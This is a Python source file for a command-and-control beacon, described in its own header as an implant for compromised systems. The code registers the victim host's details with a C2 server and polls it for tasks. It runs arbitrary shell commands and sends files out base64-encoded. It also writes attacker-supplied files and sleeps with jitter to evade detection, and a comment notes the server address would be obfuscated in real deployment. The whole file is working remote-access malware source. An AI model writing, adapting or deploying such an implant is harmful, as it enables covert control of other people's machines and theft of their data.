#!/usr/bin/env python3
"""
C2 Beacon Client - Implant for compromised systems
Communicates with C2 server, executes commands, returns results
Author: Wan Mohamad Hanis bin Wan Hassan
"""

import requests
import json
import time
import random
import socket
import platform
import subprocess
import os
import sys
from cryptography.fernet import Fernet
import base64

class C2Beacon:
    def __init__(self, c2_url: str, encryption_key: bytes, sleep: int = 60, jitter: float = 0.3):
        self.c2_url = c2_url.rstrip('/')
        self.cipher = Fernet(encryption_key)
        self.beacon_id = None
        self.sleep_time = sleep
        self.jitter = jitter
        self.session = requests.Session()
        self.session.verify = False  # Disable SSL verification for testing
        
        # Disable warnings
        import urllib3
        urllib3.disable_warnings()
    
    def get_system_info(self) -> dict:
        """Collect system information"""
        try:
            return {
                'hostname': socket.gethostname(),
                'username': os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
                'ip': self.get_local_ip(),
                'os': platform.platform(),
                'arch': platform.machine(),
                'python_version': platform.python_version()
            }
        except Exception as e:
            return {'error': str(e)}
    
    def get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "unknown"
    
    def register(self) -> bool:
        """Register with C2 server"""
        try:
            system_info = self.get_system_info()
            encrypted_data = self.cipher.encrypt(json.dumps(system_info).encode())
            
            response = self.session.post(
                f"{self.c2_url}/api/register",
                data=encrypted_data,
                timeout=30
            )
            
            if response.status_code == 200:
                self.beacon_id = self.cipher.decrypt(response.content).decode()
                print(f"[+] Registered with C2: {self.beacon_id}")
                return True
            else:
                print(f"[!] Registration failed: {response.status_code}")
                return False
        
        except Exception as e:
            print(f"[!] Registration error: {e}")
            return False
    
    def checkin(self) -> list:
        """Check in with C2 and retrieve tasks"""
        try:
            response = self.session.get(
                f"{self.c2_url}/api/checkin/{self.beacon_id}",
                timeout=30
            )
            
            if response.status_code == 200:
                decrypted = self.cipher.decrypt(response.content)
                tasks = json.loads(decrypted)
                return tasks
            else:
                return []
        
        except Exception as e:
            print(f"[!] Check-in failed: {e}")
            return []
    
    def execute_command(self, command: str, args: str) -> dict:
        """Execute command and return result"""
        result = {
            'success': False,
            'output': '',
            'error': ''
        }
        
        try:
            if command == 'shell':
                # Execute shell command
                process = subprocess.run(
                    args,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                result['output'] = process.stdout + process.stderr
                result['success'] = process.returncode == 0
            
            elif command == 'download':
                # Download file from target
                if os.path.exists(args):
                    with open(args, 'rb') as f:
                        data = base64.b64encode(f.read()).decode()
                    result['output'] = data
                    result['success'] = True
                else:
                    result['error'] = f"File not found: {args}"
            
            elif command == 'upload':
                # Upload file to target
                try:
                    filename, data = args.split('|', 1)
                    with open(filename, 'wb') as f:
                        f.write(base64.b64decode(data))
                    result['output'] = f"Uploaded: {filename}"
                    result['success'] = True
                except Exception as e:
                    result['error'] = str(e)
            
            elif command == 'sleep':
                # Update sleep interval
                self.sleep_time = int(args)
                result['output'] = f"Sleep interval: {args}s"
                result['success'] = True
            
            elif command == 'sysinfo':
                # Return system information
                info = self.get_system_info()
                result['output'] = json.dumps(info, indent=2)
                result['success'] = True
            
            elif command == 'pwd':
                # Print working directory
                result['output'] = os.getcwd()
                result['success'] = True
            
            elif command == 'cd':
                # Change directory
                try:
                    os.chdir(args)
                    result['output'] = f"Changed to: {os.getcwd()}"
                    result['success'] = True
                except Exception as e:
                    result['error'] = str(e)
            
            elif command == 'exit':
                # Beacon self-destruct
                result['output'] = "Beacon terminating..."
                result['success'] = True
                self.submit_result('exit', result)
                sys.exit(0)
            
            else:
                result['error'] = f"Unknown command: {command}"
        
        except subprocess.TimeoutExpired:
            result['error'] = "Command timeout"
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def submit_result(self, task_id: str, result: dict):
        """Submit task result to C2"""
        try:
            result_data = {
                'task_id': task_id,
                'command': result.get('command', ''),
                'output': result.get('output', ''),
                'error': result.get('error', ''),
                'success': result.get('success', False)
            }
            
            encrypted = self.cipher.encrypt(json.dumps(result_data).encode())
            
            self.session.post(
                f"{self.c2_url}/api/result/{self.beacon_id}",
                data=encrypted,
                timeout=30
            )
        
        except Exception as e:
            print(f"[!] Result submission failed: {e}")
    
    def calculate_sleep(self) -> int:
        """Calculate sleep time with jitter"""
        jitter_value = random.uniform(-self.jitter, self.jitter)
        actual_sleep = int(self.sleep_time * (1 + jitter_value))
        return max(actual_sleep, 1)
    
    def run(self):
        """Main beacon loop"""
        print(f"[*] C2 Beacon starting...")
        print(f"[*] C2 Server: {self.c2_url}")
        print(f"[*] Sleep: {self.sleep_time}s (jitter: {self.jitter*100}%)")
        
        # Register with C2
        if not self.register():
            print("[!] Failed to register. Exiting.")
            return
        
        print("[*] Beacon loop started. Press Ctrl+C to exit.")
        
        try:
            while True:
                # Check in and get tasks
                tasks = self.checkin()
                
                # Execute tasks
                for task in tasks:
                    task_id = task.get('task_id')
                    command = task.get('command')
                    args = task.get('args', '')
                    
                    print(f"[*] Executing: {command} {args}")
                    
                    result = self.execute_command(command, args)
                    result['command'] = command
                    
                    # Submit result
                    self.submit_result(task_id, result)
                
                # Sleep with jitter
                sleep_time = self.calculate_sleep()
                time.sleep(sleep_time)
        
        except KeyboardInterrupt:
            print("\n[*] Beacon stopped by user")
        except Exception as e:
            print(f"[!] Beacon error: {e}")

if __name__ == "__main__":
    # Configuration (in real deployment, these would be embedded/obfuscated)
    C2_URL = "http://localhost:8080"
    
    # Encryption key (must match server key)
    ENCRYPTION_KEY = b'your-encryption-key-from-server-here'
    
    # Sleep configuration
    SLEEP_INTERVAL = 30  # seconds
    JITTER = 0.3  # 30% jitter
    
    # Create and run beacon
    beacon = C2Beacon(
        c2_url=C2_URL,
        encryption_key=ENCRYPTION_KEY,
        sleep=SLEEP_INTERVAL,
        jitter=JITTER
    )
    
    beacon.run()
